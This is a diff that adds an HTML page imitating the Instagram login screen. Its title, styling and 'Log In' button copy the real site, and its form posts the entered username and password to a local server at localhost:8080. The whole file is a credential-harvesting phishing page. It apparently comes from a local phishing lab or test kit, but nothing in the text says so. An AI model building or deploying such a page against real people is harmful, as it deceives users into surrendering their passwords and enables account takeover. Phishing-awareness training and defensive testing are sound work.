@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login • Instagram</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; background-color: #fafafa; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 300px; text-align: center; }
+        input { width: 100%; margin: 6px 0; padding: 9px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="font-style: italic;">Instagram</h2>
+        <form action="http://localhost:8080" method="POST">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
